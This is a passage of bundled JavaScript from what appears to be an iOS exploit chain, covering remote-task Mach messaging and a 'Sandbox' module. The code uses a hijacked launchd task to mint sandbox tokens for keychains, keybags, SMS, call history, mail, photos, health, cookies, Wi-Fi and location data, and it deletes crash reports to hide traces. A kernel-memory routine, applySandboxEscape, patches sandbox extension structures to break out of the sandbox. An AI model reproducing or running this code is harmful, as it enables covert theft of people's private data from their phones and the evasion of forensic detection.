		msg.msgh_remote_port = this.#localPort;
		msg.msgh_local_port = port;
		msg.msgh_size = 24;
		msg.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, right);

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_msg_send", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
			console.log(TAG, "insertRight: error while sending message: " + errString);
			return 0;
		}
		
		//TODO receive in remote task
		msg.msgh_size = 0x100;
		msg.msgh_local_port = this.#remotePort;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
		this.write(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, 24);

		ret = this.#doRemoteCallStable(100, "mach_msg_receive", this.#trojanMem);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
			console.log(TAG, "insertRight: error while receiving message: " + errString);
			return 0;
		}

		this.read(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
		let recvBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
		let recvMsg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](recvBuff);
		//console.log(TAG, "Recv msg id: " + Utils.hex(recvMsg.msgh_id));
		//console.log(TAG, "Recv remote port: " + Utils.hex(recvMsg.msgh_remote_port));

		ret = this.#doRemoteCallStable(100, "fileport_makefd", recvMsg.msgh_remote_port);
		if (ret < 0) {
			console.log(TAG, "insertRight: error with fileport_makefd");
			return 0;
		}
		//console.log(TAG, "Remote fileport_makefd: " + ret);

		return ret;
	}

	#putShmemInCache(shmem)
	{
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if (!this.#shmemCache[i])
			{
				// TODO encapsulate this inside shmem struct
				let shmemBuff = new ArrayBuffer(0x18);
				this.#shmemCache[i] = new _VMShmem__WEBPACK_IMPORTED_MODULE_10__["default"](shmemBuff);
				this.#shmemCache[i].port = shmem.port;
				this.#shmemCache[i].localAddress = shmem.localAddress;
				this.#shmemCache[i].remoteAddress = shmem.remoteAddress;
				return this.#shmemCache[i];
			}
		}
		return null;
	}

	#getShmemForPage(pageAddr)
	{
		let remotePage = this.#getShmemFromCache(pageAddr);
		if (!remotePage)
		{
			//console.log(TAG, `Page not found in cache: ${Utils.hex(pageAddr)}`);
			let newRemotePage = _VM__WEBPACK_IMPORTED_MODULE_9__["default"].mapRemotePage(this.#vmMap, pageAddr);
			if (!newRemotePage || !newRemotePage.localAddress)
				return false;
			return this.#putShmemInCache(newRemotePage);
		}
		//console.log(TAG, `Page found in cache: ${Utils.hex(pageAddr)}`);
		return remotePage;
	}

	#getShmemFromCache(pageAddr)
	{
		//console.log(TAG,`getShmemFromCache(): pageAddr=${Utils.hex(pageAddr)}`);
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if(this.#shmemCache[i])
				if (this.#shmemCache[i].remoteAddress === pageAddr)
					return this.#shmemCache[i];
		}
		return null;
	}
	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(dst, str);
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("CFStringCreateWithCString", 0n, dst, kCFStringEncodingUTF8);
	}

	#EXC_GUARD_ENCODE_TYPE(code, type)
	{
		code |= ((type & BigInt('0x7')) << 61n);
		return code;
	}

	#EXC_GUARD_ENCODE_FLAVOR(code, flavor)
	{
		code |= ((flavor & BigInt('0x1fffffff')) << 32n);
		return code;
	}
	
	#EXC_GUARD_ENCODE_TARGET(code, target)
	{
		code |= target & BigInt('0xffffffff');
		return code;
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Sandbox.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/Sandbox.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Sandbox)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/FileUtils */ "./src/libs/JSUtils/FileUtils.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _RemoteCall__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");


const TAG = "SANDBOX";

class Sandbox {

	static #launchdTask = null;
	static #PathDictionary = {
		// Communications
		"/private/var/mobile/Library/AddressBook/":0,
		"/private/var/mobile/Library/CallHistoryDB/":0,
		"/private/var/mobile/Library/DoNotDisturb/":0,
		"/private/var/mobile/Library/SMS/":0,
		"/private/var/mobile/Library/Calendar/":0,
		"/private/var/mobile/Library/Mail/":0,
		"/private/var/mobile/Library/Voicemail/":0,
		"/var/mobile/Library/Recordings":0,
		
		// Location
		"/private/var/root/Library/Caches/locationd":0,
		"/private/var/root/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/com.apple.routined/":0,
		
		// Browser & Cookies
		"/private/var/mobile/Library/Safari/":0,
		"/private/var/mobile/Library/Cookies/":0,
		"/private/var/mobile/Cookies/":0,
		
		// Credentials & WiFi
		"/private/var/Keychains/":0,
		"/var/Keychains/":0,
		"/private/var/keybags/":0,
		"/var/keybags/":0,
		"/private/var/keybags/systembag.kb":0,
		"/private/var/keybags/persona.kb":0,
		"/private/var/keybags/usersession.kb":0,
		"/private/var/keybags/backup/":0,
		"/var/keybags/":0,
		"/var/keybags/systembag.kb":0,
		"/var/keybags/persona.kb":0,
		"/var/keybags/usersession.kb":0,
		"/var/keybags/backup/":0,
		"/var/keybags/backup/backup_keys_cache.sqlite":0,
		"/private/var/preferences/com.apple.wifi.known-networks.plist":0,
		"/private/var/preferences/SystemConfiguration/":0,
		"/private/var/preferences/SystemConfiguration/preferences.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist":0,
		"/private/var/networkd/db/":0,
		"/var/wireless/":0,
		"/private/var/wireless/":0,
		"/var/wireless/Library/":0,
		"/var/wireless/Library/Caches/":0,
		"/var/wireless/Library/Preferences/":0,
		"/var/wireless/Library/Databases/":0,
		"/var/wireless/Library/ControlCenter/":0,
		"/private/var/wireless/Library/":0,
		"/private/var/wireless/Library/Preferences/":0,
		"/private/var/wireless/Library/Databases/":0,
		"/private/var/wireless/Library/ControlCenter/":0,
		"/private/var/mobile/Library/CoreDuet/":0,
		"/private/var/mobile/Library/CoreDuet/People/":0,
		"/private/var/mobile/Library/PersonalizationPortrait/":0,
		"/var/log/":0,
		"/private/var/log/":0,
		"/var/db/":0,
		"/private/var/db/":0,
		"/var/run/":0,
		"/private/var/run/":0,
		
		// Personal Data
		"/private/var/mobile/Library/Notes/":0,
		"/private/var/mobile/Library/Health/":0,
		"/private/var/mobile/Media/":0,
		"/private/var/mobile/Media/PhotoData/":0,
		"/private/var/mobile/Media/DCIM/":0,
		"/var/mobile/Media/":0,
		"/var/mobile/Media/PhotoData/":0,
		"/var/mobile/Media/DCIM/":0,
		
		// Device Info
		"/private/var/root/Library/Lockdown/":0,
		"/private/var/mobile/Library/Preferences/":0,
		"/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist":0,
		"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist":0,
		
		// Accounts
		"/private/var/mobile/Library/Accounts/":0,
		
		// Protected & Trust
		"/private/var/protected/trustd/private/":0,
		"/private/var/protected/trustd/private":0,
		
		// System & Apps
		"/bin/":0,
		"/Applications/":0,
		"/private/var/containers/Bundle/Application/":0,
		"/var/containers/Bundle/Application/":0,
		"/private/var/containers/Shared/SystemGroup/":0,
		"/private/var/mobile/Containers/Data/Application/":0,
		"/var/mobile/Containers/Data/Application/":0,
		"/private/var/mobile/Containers/Shared/AppGroup/":0,
		
		// Notifications & Logs
		"/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json":0,
		"/private/var/mobile/Library/UserNotifications/":0,
		"/private/var/mobile/Library/Logs/CrashReporter/":0,
		"/private/var/mobile/Library/ExternalAccessory":0,
		"/private/var/mobile/Library/Shortcuts/":0,
		
		// Temp directory for file operations
		"/private/var/tmp/":0,
		"/tmp/":0
		/* not allowed via launchd
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-wal":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-shm":0
		*/
	};

	static initWithLaunchdTask(launchdTask) {
		this.#launchdTask = launchdTask;
	}

	static getTokenForPath(path, consume=false)
	{

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		//console.log(TAG,`Creating token for path:${path}`);
		let memRemote = this.#launchdTask.mem();
		let pathRemote = memRemote;
		this.#launchdTask.writeStr(pathRemote,path);
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let sandboxExtensionEntry = memRemote + 0x100n;
		this.#launchdTask.writeStr(sandboxExtensionEntry,appSandboxReadExt);
		let tokenRemote = this.#launchdTask.call(100, "sandbox_extension_issue_file",sandboxExtensionEntry,pathRemote,0n,0n);
		if (!tokenRemote) {
			console.log(TAG, "Unable to create token for: " + path);
			return null;
		}
		//console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
		let token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
		this.#launchdTask.read(tokenRemote,token,512n);
		if(consume)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",token);
		token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token,512);
		//console.log(TAG,`token:${token}`);
		if(!token || !token.includes("com.apple.app-sandbox.read-write"))
		{
			console.log(TAG,`Found weird token:${token}, not registering`);
			return null;
		}
		return token;
	}

	static createTokens()
	{
		// 18.6.1+ → iOS18nui full token path (slim issue+consume+usleep reboots A14/18.6.2).
		// 18.6.0 → keep lab slim (historically safer on some A13).
		function __tokIosPat() {
			try {
				var N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"];
				var sizePtr = N.callSymbol("calloc", 1, 8);
				if (!sizePtr || sizePtr === 0n) return -1;
				var rc = Number(N.callSymbol("sysctlbyname", "kern.osproductversion", 0, sizePtr, 0, 0));
				if (rc !== 0) { N.callSymbol("free", sizePtr); return -1; }
				var sz = Number(N.readPtr(BigInt(sizePtr)));
				if (sz <= 0 || sz > 64) { N.callSymbol("free", sizePtr); return -1; }
				var buf = N.callSymbol("malloc", BigInt(sz + 1));
				if (!buf || buf === 0n) { N.callSymbol("free", sizePtr); return -1; }
				N.write64(sizePtr, BigInt(sz + 1));
				rc = Number(N.callSymbol("sysctlbyname", "kern.osproductversion", buf, sizePtr, 0, 0));
				var s = "";
				if (rc === 0) { try { s = N.readString(buf, sz).replace(/\0/g, ""); } catch (_rs) {} }
				N.callSymbol("free", buf);
				N.callSymbol("free", sizePtr);
				var m = String(s).match(/^18\.6(?:\.(\d+))?/);
				if (!m) return -1;
				return m[1] ? (parseInt(m[1], 10) || 0) : 0;
			} catch (_e) { return -1; }
		}
		var __pat = __tokIosPat();
		var __useNuiTok = (__pat >= 1);
		console.log(TAG, "Create tokens mode=" + (__useNuiTok ? "nui-full" : "lab-slim") + " iosPat=" + __pat);

		if (!__useNuiTok) {
			// Lab slim: launchd temp-RemoteCall dies on A13 if we issue 200+ sandbox tokens.
			console.log(TAG, "Create tokens (lab slim)...");
			const slim = [
				"/private/var/Keychains/",
				"/var/Keychains/",
				"/private/var/Keychains/keychain-2.db",
				"/private/var/Keychains/keychain-2.db-wal",
				"/private/var/Keychains/keychain-2.db-shm",
				"/var/Keychains/keychain-2.db",
				"/var/Keychains/keychain-2.db-wal",
				"/var/Keychains/keychain-2.db-shm",
				"/private/var/Keychains/System.keybag",
				"/private/var/Keychains/Backup.keybag",
				"/private/var/Keychains/persona.kb",
				"/private/var/Keychains/usersession.kb",
				"/private/var/Keychains/device.kb",
				"/private/var/keybags/",
				"/var/keybags/",
				"/private/var/keybags/systembag.kb",
				"/private/var/keybags/persona.kb",
				"/private/var/tmp/",
				"/tmp/",
				"/bin/",
				"/Applications/",
				"/private/var/containers/Bundle/Application/",
				"/var/containers/Bundle/Application/",
				"/private/var/mobile/Containers/Data/Application/",
				"/var/mobile/Containers/Data/Application/",
				"/private/var/mobile/Containers/Shared/AppGroup/",
				"/private/var/containers/Shared/SystemGroup/",
				"/private/var/mobile/Media/",
				"/private/var/preferences/SystemConfiguration/",
				"/private/var/preferences/SystemConfiguration/preferences.plist",
				"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
				"/private/var/preferences/com.apple.wifi.known-networks.plist",
				"/var/wireless/",
				"/private/var/wireless/",
			];
			let ok = 0;
			for (let i = 0; i < slim.length; i++) {
				const key = slim[i];
				try {
					const tok = this.getTokenForPath(key, false);
					this.#PathDictionary[key] = tok;
					this.getTokenForPath(key, true);
					if (tok) ok++;
				} catch (_) {}
				try {
					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("usleep", 80000);
				} catch (_) {}
			}
			console.log(TAG, "Create tokens slim done ok=" + ok + "/" + slim.length);
			return;
		}

		// ===== iOS18nui createTokens (proven 18.6.1 / 18.6.2) =====
		console.log(TAG, "Create tokens (nui-full)...");
		function __tokProg(msg) {
			try { console.log(TAG, msg); } catch (_c) {}
			try { if (typeof p7_flog === "function") p7_flog("PEMK-B1 tok " + msg); } catch (_p) {}
			try { if (typeof LOG === "function") LOG("[PE] tok " + msg); } catch (_l) {}
		}
		var __tokSafe = (function(path, consume) {
			try {
				return this.getTokenForPath(path, consume);
			} catch (eTok) {
				__tokProg("FAIL " + path + " " + String(eTok).slice(0, 80));
				return null;
			}
		}).bind(this);
		let keys = Object.keys(this.#PathDictionary);
		__tokProg("dict begin n=" + keys.length);
		for (let ki = 0; ki < keys.length; ki++) {
			var key = keys[ki];
			this.#PathDictionary[key] = __tokSafe(key, false);
			if ((ki % 10) === 0 || ki === keys.length - 1)
				__tokProg("dict " + (ki + 1) + "/" + keys.length + " last=" + key);
		}
		__tokProg("consume begin");

		this.getTokenForPath("/bin/", true);
		this.getTokenForPath("/Applications/", true);
		this.getTokenForPath("/private/var/tmp/", true);
		this.getTokenForPath("/tmp/", true);
		this.getTokenForPath("/private/var/mobile/Media/", true);
		this.getTokenForPath("/private/var/mobile/Containers/Data/Application/", true);
		this.getTokenForPath("/var/mobile/Containers/Data/Application/", true);
		this.getTokenForPath("/private/var/mobile/Containers/Shared/AppGroup/", true);
		this.getTokenForPath("/private/var/containers/Bundle/Application/", true);
		this.getTokenForPath("/var/containers/Bundle/Application/", true);
		this.getTokenForPath("/private/var/containers/Shared/SystemGroup/", true);
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/preferences.plist", true);
		this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3", true);
		this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
		this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);

		console.log(TAG, "Create tokens for forensic paths...");
		this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
		this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
		this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
		this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);

		this.getTokenForPath("/private/var/Keychains/", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);

		this.getTokenForPath("/var/Keychains/", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);

		this.getTokenForPath("/private/var/keybags/", true);
		this.getTokenForPath("/private/var/keybags/systembag.kb", true);
		this.getTokenForPath("/private/var/keybags/persona.kb", true);
		this.getTokenForPath("/private/var/keybags/usersession.kb", true);
		this.getTokenForPath("/private/var/keybags/backup/", true);

		this.getTokenForPath("/var/keybags/", true);
		this.getTokenForPath("/var/keybags/systembag.kb", true);
		this.getTokenForPath("/var/keybags/persona.kb", true);
		this.getTokenForPath("/var/keybags/usersession.kb", true);
		this.getTokenForPath("/var/keybags/backup/", true);
		this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);

		this.getTokenForPath("/private/var/Keychains/System.keybag", true);
		this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
		this.getTokenForPath("/private/var/Keychains/persona.kb", true);
		this.getTokenForPath("/private/var/Keychains/usersession.kb", true);
		this.getTokenForPath("/private/var/Keychains/device.kb", true);
		this.getTokenForPath("/var/Keychains/persona.kb", true);

		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", true);
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
		this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);

		this.getTokenForPath("/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/Library/", true);
		this.getTokenForPath("/private/var/wireless/Library/Preferences/", true);
		this.getTokenForPath("/private/var/wireless/Library/Databases/", true);
		this.getTokenForPath("/private/var/wireless/Library/ControlCenter/", true);
		this.getTokenForPath("/private/var/mobile/Library/CoreDuet/", true);
		this.getTokenForPath("/private/var/mobile/Library/PersonalizationPortrait/", true);
		this.getTokenForPath("/var/log/", true);
		this.getTokenForPath("/private/var/log/", true);
		this.getTokenForPath("/var/db/", true);
		this.getTokenForPath("/private/var/db/", true);
		this.getTokenForPath("/var/run/", true);
		this.getTokenForPath("/private/var/run/", true);
		this.getTokenForPath("/private/var/networkd/", true);

		this.getTokenForPath("/private/var/mobile/Library/Safari/", true);
		this.getTokenForPath("/private/var/mobile/Library/Cookies/", true);
		this.getTokenForPath("/private/var/mobile/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/root/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/mobile/Library/Notes/", true);
		this.getTokenForPath("/private/var/mobile/Library/Calendar/", true);
		this.getTokenForPath("/private/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/var/mobile/Media/", true);

		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
		this.getTokenForPath("/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/private/var/mobile/Library/Health/", true);
		this.getTokenForPath("/private/var/root/Library/Lockdown/", true);
		this.getTokenForPath("/private/var/mobile/Library/Preferences/", true);
		this.getTokenForPath("/private/var/mobile/Library/Accounts/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mail/", true);
		this.getTokenForPath("/private/var/mobile/Library/FrontBoard/", true);
		console.log(TAG, "Create tokens nui-full done");
		try { if (typeof p7_flog === "function") p7_flog("PEMK-B1 tok nui-full done"); } catch (_pd) {}
	}

	static applyTokensForRemoteTask(remoteTask)
	{
		let remoteMem = remoteTask.mem();
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
		{
			if(this.#PathDictionary[key])
			{
				//console.log(TAG,`Applying:${this.#PathDictionary[key]}`);
				remoteTask.writeStr(remoteMem,this.#PathDictionary[key]);
				remoteTask.call(100,"sandbox_extension_consume",remoteMem);
				//console.log(TAG,`Result of consume:${resConsume}`);
			}
		}
	}

	static destroy()
	{
		if(this.#launchdTask)
			this.#launchdTask.destroy();
	}

	static deleteCrashReports()
	{
		this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
		libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
	}

	static adjustMemoryPressure(processName) {
		const MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK = 5;
		const MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT = 6;
		const MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED = 16;

		let pid = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].pidof(processName);
		if (!pid) {
			console.log(TAG, "Unable to get pid of: " + processName);
			return;
		}

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		let memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK,pid,-1,0,0);
		console.log(TAG,`waterMark result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED,pid,0,0,0);
		console.log(TAG,`isManaged result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT,pid,0,0,0);
		console.log(TAG,`taskLimit result: ${memResult}`);
	}
	static applySandboxEscape() {
		let _CS_DARWIN_USER_TEMP_DIR = 65537n;
		let write_file_path = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("calloc", 1n, 1024n);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("confstr", _CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
		let randomHex = "/" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("arc4random"));
		let randomHexPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].writeString(randomHexPtr, randomHex);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strcat", write_file_path, randomHexPtr);

		// mktmp should work
		// confstrr path
		// also in pe
		//let procPath = "/private/var/tmp/com.apple.mediaplaybackd/Library/HTTPStorages/com.apple.mediaplaybackd/"
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let extension = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_issue_file",appSandboxReadExt,write_file_path,0n,0n);
		if (!extension) {
			console.log(TAG,`Sandbox failure 1`);
			return false;
		}
		let resConsume = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",extension);
		if (resConsume == -1) {
			console.log(TAG,`Sandbox failure 2`);
			return false;
		}
		let ourTaskAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskAddrByPID(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("getpid"));
		console.log(TAG,`ourTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourTaskAddr)}`);
		let ourProcAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskProc(ourTaskAddr);
		console.log(TAG,`ourProcAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourProcAddr)}`);
		let credRefAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ourProcAddr + 0x18n);
		if (credRefAddr == 0n) {
			console.log(TAG,`Sandbox failure 3`);
			return false;
		}
		credRefAddr = credRefAddr + 0x28n;
		let credAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credRefAddr);
		if (credAddr == 0n) {
			console.log(TAG,`Sandbox failure 4`);
			return false;
		}
		console.log(TAG,`credRefAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(credRefAddr)}`);
		let labelAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credAddr + 0x78n);
		if (labelAddr == 0n) {
			console.log(TAG,`Sandbox failure 5`);
			return false;
		}
		console.log(TAG,`labelAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(labelAddr)}`);
		let sandboxAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(labelAddr + 0x8n + 1n * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
		if (sandboxAddr == 0n) {
			console.log(TAG,`Sandbox failure 6`);
			return false;
		}
		console.log(TAG,`sandboxAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(sandboxAddr)}`);
		let ext_setAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(sandboxAddr + 0x10n);
		if (ext_setAddr == 0n) {
			console.log(TAG,`Sandbox failure 7`);
			return false;
		}
		console.log(TAG,`ext_setAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ext_setAddr)}`);
		let ext_tableAddr = ext_setAddr + 0x0n; // koffsetof(extension_set, ext_table) = 0x0
		let hash = 0n;
		console.log(TAG,`hash:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(hash)}`);
		//hash = 4n; // for read
		hash = 0n; // for read-write
		let ext_hdrAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_tableAddr + hash * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
		if (ext_hdrAddr == 0n) {
			console.log(TAG,`Sandbox failure 8`);
			return false;
		}
		/*
		newHash = hashing_magic(appSandboxReadWriteExt);
		LOG("ext_hdrAddr:%llx",ext_hdrAddr);
		sleep(1);
		mach_vm_address_t nullAddr = 0;
		chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
		chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
		*/
		for (;;) {
			let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
			if(nextAddr == 0n)
				break;
			ext_hdrAddr = nextAddr;
		}
		let ext_lstAddr = ext_hdrAddr + 0x8n; // koffsetof(extension_hdr, ext_lst) == 0x8
		let extAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_lstAddr);
		if (extAddr == 0n) {
			console.log(TAG,`Sandbox failure 9`);
			return false;
		}
		console.log(TAG,`extAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(extAddr)}`);
		let dataLength = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x48n);
		let dataAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x40n);
		if(dataLength == 0n || dataAddr == 0n) {
			console.log(TAG,`Sandbox failure 10`);
			return false;
		}
		let pathLength = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strlen",write_file_path) + 1;
		console.log(TAG,`dataLength:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(dataLength)} pathLength:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(pathLength)}`);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write8(dataAddr, 0);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write64(extAddr + 0x48n,0n);

		console.log(TAG, `Finished succesfully`);

		return true;
	}
